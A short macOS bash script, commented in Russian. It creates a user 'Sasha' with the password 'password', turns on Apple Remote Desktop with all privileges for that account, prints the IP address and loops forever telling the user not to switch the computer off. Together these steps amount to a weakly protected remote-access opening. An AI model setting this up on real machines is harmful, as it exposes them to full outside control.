#!/bin/bash

# Создание пользователя Sasha
sudo dscl . -create /Users/Sasha
sudo dscl . -create /Users/Sasha UserShell /bin/bash
sudo dscl . -create /Users/Sasha RealName "Sasha"
sudo dscl . -create /Users/Sasha UniqueID "1001"
sudo dscl . -create /Users/Sasha PrimaryGroupID 1001
sudo dscl . -create /Users/Sasha NFSHomeDirectory /Users/Sasha
sudo dscl . -passwd /Users/Sasha password

# Включение удаленного управления для пользователя Sasha
sudo defaults write /Library/Preferences/com.apple.RemoteManagement ARD_AllLocalUsers -bool false
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -users Sasha -privs -all -restart -agent -menu

# Вывод IP-адреса
ipconfig getifaddr en0

# Бесконечный цикл, чтобы скрипт не завершался
while true; do
    echo "Не выключай компьютер!"
    sleep 10
done
